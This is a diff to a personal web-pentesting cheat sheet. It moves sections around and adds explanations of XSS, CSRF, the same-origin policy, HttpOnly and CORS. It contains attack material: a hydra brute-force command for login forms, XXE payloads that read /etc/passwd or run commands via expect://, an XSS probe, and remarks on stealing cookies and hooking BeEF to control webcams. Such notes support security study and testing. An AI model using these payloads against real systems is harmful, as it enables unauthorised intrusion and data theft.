@@ -7,12 +7,12 @@ permalink: /web/
 # Index
 
 * [Authentication](#authentication)
-* [Session Management](#session-management)
-* [XML External Entity](#xml-external-entity)
 * [SQL Injection](#sql-injection)
-* [PHP Injection](#php-injection)
 * [Cross Site Scripting](#cross-site-scripting)
+* [PHP Injection](#php-injection)
+* [XML External Entity](#xml-external-entity)
 * [Deserialization](#deserialization)
+* [Import Web Security Concepts](#important-web-security-concepts)
 * [Other Tools](#other-tools)
 * [Methodology](#methodology)
 
@@ -25,39 +25,6 @@ permalink: /web/
 For example attacking a web login form
 
 `hydra 192.168.1.69 http-form-post "form_login.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -o hydra-http-post-attack.txt`
-
----
-
-## Session Management
-
----
-
-## XML External Entity
-
-Local file inclusion
-
-```XML
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [ <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-<creds>
-    <user>&xxe;</user>
-    <pass>mypass</pass>
-</creds>
-```
-
-Remote code exectuion
-
-```XML
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [ <!ELEMENT foo ANY >
-<!ENTITY xxe SYSTEM "expect://id" >]>
-<creds>
-    <user>&xxe;</user>
-    <pass>mypass</pass>
-</creds>
-```
-Above is just proof of concept, other functions exist.
 
 ---
 
@@ -116,6 +83,37 @@ SQL Fuzzing Strings
 ```
 ---
 
+## Cross Site Scripting XSS
+
+XSS is the injection of client-side scripts into web pages viewed by other users. 
+
+If we can inject XSS into a page, then we can redirect a user to server we control and grab their cookies for that page.
+
+If the httponly flag is set on the cookies this tells the browser that only the server can access them, never the client. This means we can't dump the cookies as above. However with XSS we can still perform whatever actions the user can perform as the user without their control or consent.
+
+We can also inject a beefsuite hook that allows use to perform many XSS feats, activate webcams, etc.
+
+Test for wherever user input is reflect in the site with:
+
+``` Javascript
+    <script>alert('x')</script>
+```
+
+---
+
+## Cross Site Request Forgery (CSRF)
+
+If a user is logged into a website (has an active session/token) and at the same times accesses a malicious website then a CSRF attack can occur.
+
+THe malicious website is designed to submit a request to the website the user is logged in to without the user being aware.
+Since the request will have the session cookie/token attached to it the website believes the request is valid and actions accordingly.
+
+The referral header is sometimes used to try and minimize the risk of this attack, although it introduces issues with adblockers and anonymity plugins and features of browsers.
+
+Ideally on the website that hosts the form a CSRF Token is assigned whenever a form is requested. Then when the form is submitted the token is attached. These should be unique and impossible to guess, so that when the malicious site attempts a request with the users cookies the CSRF doesn't match and nothing happens.
+
+---
+
 ## PHP Injection
 
 If we can inject the below string anywhere interpreted as php we get RCE.
@@ -130,17 +128,52 @@ Other things to try https://websec.wordpress.com/2010/02/22/exploiting-php-file-
 
 ---
 
-## Cross Site Scripting
+## XML External Entity
 
-Wherever user input is reflect in the site test for XSS with:
+Local file inclusion
 
-``` Javascript
-    <script>alert('x')</script>
+```XML
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
 ```
+
+Remote code exectuion
+
+```XML
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+```
+Above is just proof of concept, other functions exist.
 
 ---
 
 ## Deserialization
+
+---
+
+## Import Web Security Concepts
+
+### Same Origin Policiy
+
+Same Origin Policy permits scripts contained in a first web page to access data in a second web page, but only if both web pages have the same origin. An origin is defined as a combination of URI scheme, host name, and port number. This is a ket security concept that prevents a malicious script on one page from obtaining access to sensitive data on another web page.
+
+### httponly
+
+HttpOnly is an additional flag included in a Set-Cookie HTTP response header. Using the HttpOnly flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie. 
+
+### Cross-Origin Resource Sharing (CORS)
+
+CORS is a mechanism that uses additional HTTP headers to tell a browser to let a web application running at one origin to access selected resources from a server at a different origin. 
 
 ---
 
